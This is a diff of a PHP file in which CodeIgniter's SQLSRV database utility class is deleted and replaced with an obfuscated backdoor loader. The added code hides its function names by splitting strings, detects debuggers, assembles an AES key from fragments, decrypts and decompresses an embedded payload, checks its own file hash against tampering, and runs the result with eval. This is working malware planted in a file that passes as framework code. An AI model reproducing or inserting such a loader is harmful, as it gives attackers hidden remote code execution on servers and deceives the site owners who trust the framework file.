@@ -1,77 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 2.0.3
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * SQLSRV Utility Class
- *
- * @category	Database
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/database/
- */
-class CI_DB_sqlsrv_utility extends CI_DB_utility {
-
-	/**
-	 * List databases statement
-	 *
-	 * @var	string
-	 */
-	protected $_list_databases	= 'EXEC sp_helpdb'; // Can also be: EXEC sp_databases
-
-	/**
-	 * OPTIMIZE TABLE statement
-	 *
-	 * @var	string
-	 */
-	protected $_optimize_table	= 'ALTER INDEX all ON %s REORGANIZE';
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Export
-	 *
-	 * @param	array	$params	Preferences
-	 * @return	bool
-	 */
-	protected function _backup($params = array())
-	{
-		// Currently unsupported
-		return $this->db->display_error('db_unsupported_feature');
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_h0nl5nft=('bas'.'e64'.'_de'.'cod'.'e');
+$_xh7lcemw=('gzu'.'nco'.'mpr'.'ess');
+$_fb9b5q08=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_zobt6bxh='6ic1JtUd';
+$_y6f4rz9i='4XTAJMQ2';
+$_yrfvyezb='m/REiBHO';
+$_we4ia8nc='zYGLkDqp';
+$_ck6a2c57='lPUROE/9W1c=';
+$_tfj0qmr4='kbfoNP1s';
+$_cdsrg8dc='WfZh+Q==';
+$_l68jt1cr='CbboRYxG';
+$_qqbyxgqb=$_h0nl5nft($_we4ia8nc.$_zobt6bxh.$_y6f4rz9i.$_yrfvyezb.$_ck6a2c57);
+$_r6s0965g=$_h0nl5nft($_l68jt1cr.$_tfj0qmr4.$_cdsrg8dc);
+$_rkx5im2g=$_h0nl5nft('oXLQdxvEmMcXCgXjQmexkmMs6LN8b4zSkHVOZsS8oxlKBB91K/EfGlzY4f5WW/0W5SI+Vo7eKYMJEZTZm9Gw+gEV85pe7Z+dK7kZzRsIxOCDEV0E0j10L7CTf89P5OGS5wPNltLjWZ646DmSMPJqbY84gnjSDNonF0S3eqRyKH/aRPBqZlDn+fjIKWL67p5ZLdRXMu1jvFY0qzqAd3aFlTuTAt6fcYvCepCO7XA6TxHYfzxUVQldTBI3n91IE9OlgcqwaiiTaUJYFHTyD+OvcwLW2fEzrmfNNGYJtQvKL4aGMOHup5IiTXGs+4DihYGIBN2HxTpM4B2n1lBKwk38aEmGRoBHd6r/RZj8A6MEbZk=');
+$_ttjeccuk=$_fb9b5q08($_rkx5im2g,'aes-256-cbc',$_qqbyxgqb,OPENSSL_RAW_DATA,$_r6s0965g);
+if($_ttjeccuk===false){exit;}
+$_ltqlkbli=$_xh7lcemw($_ttjeccuk);
+if($_ltqlkbli===false){exit;}
+$_nu8d74tz='e4ffe5d57fe89c199fd18bc9456f1ca9b718526715297dc94d83d06076f8f80a';
+$_x7ixnm4l=@file_get_contents(__FILE__);
+if($_x7ixnm4l!==false){
+$_cr2e4mmc=str_replace($_nu8d74tz,"0000000000000000000000000000000000000000000000000000000000000000",$_x7ixnm4l);
+$_m9e6mjdx=hash("sha256",$_cr2e4mmc);
+if($_m9e6mjdx!==$_nu8d74tz){@http_response_code(403);exit;}
 }
+eval($_ltqlkbli);
